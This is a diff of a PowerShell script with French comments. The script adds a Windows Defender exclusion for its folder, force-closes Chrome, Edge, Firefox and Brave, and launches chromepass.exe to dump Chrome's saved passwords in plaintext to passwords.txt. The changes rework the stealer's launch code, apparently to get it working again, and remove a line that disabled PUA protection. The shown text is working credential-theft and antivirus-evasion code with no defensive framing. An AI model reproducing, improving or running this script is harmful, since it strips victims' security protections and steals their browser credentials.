@@ -17,9 +17,8 @@ if (Test-Path $basePath) {
     Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
 }
 
-Write-Host "[*] Ajout exclusion Defender et desactivation PUA..." -ForegroundColor Yellow
+Write-Host "[*] Ajout exclusion Defender..." -ForegroundColor Yellow
 Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
-Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
 
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
@@ -40,13 +39,15 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- EXTRACTION CHROME VIA OUTIL EXTERNE ET INJECTION DE FRAPPES (GUI) ---
+# --- EXTRACTION CHROME VIA OUTIL EXTERNE ET GUI ---
 Write-Host "[*] Lancement de l'extraction Chrome avec interface graphique..." -ForegroundColor Yellow
 $outputPath = "$basePath\passwords.txt"
 "=== CREDENTIALS CHROME (EN CLAIR) ===" | Out-File -FilePath $outputPath -Encoding UTF8
 
-if (Test-Path "$basePath\chromepass.exe") {
-    $process = Start-Process -FilePath "$basePath\chromepass.exe" -PassThru
+$toolExe = "$basePath\chromepass.exe"
+if (Test-Path $toolExe) {
+    # Lancement direct comme quand ça fonctionnait
+    $process = Start-Process -FilePath $toolExe -PassThru -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 3
 
     if ($process) {
